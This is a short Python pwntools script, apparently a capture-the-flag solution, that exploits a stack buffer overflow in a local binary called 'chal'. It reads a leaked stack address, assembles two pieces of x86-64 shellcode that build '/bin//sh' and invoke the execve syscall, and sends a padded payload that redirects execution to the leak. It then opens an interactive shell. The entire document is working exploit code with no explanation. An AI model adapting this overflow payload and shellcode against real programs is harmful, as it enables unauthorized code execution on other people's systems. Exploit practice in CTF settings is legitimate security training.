
from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e


p.recvline()
l = p.recvline()
start = int(l[len("Let's start at 0x"):-1],16)
s = asm(f"""
xor rdx, rdx
movabs rbx, 0x68732f2f6e69622f
jmp rsp
""")
s2 = asm("""
xor rsi, rsi
push rax
push rbx
push rsp
pop rdi
mov al, 0x3b
syscall
""")
print(len(s),s)
assert len(s)<16
#gdb.attach(p)
pl = s + b"\xcc"*(15-len(s))+b"E"+b"a"*8+p64(start)+s2
print(len(pl))
assert len(pl) < 48
p.sendline(pl)
p.interactive()
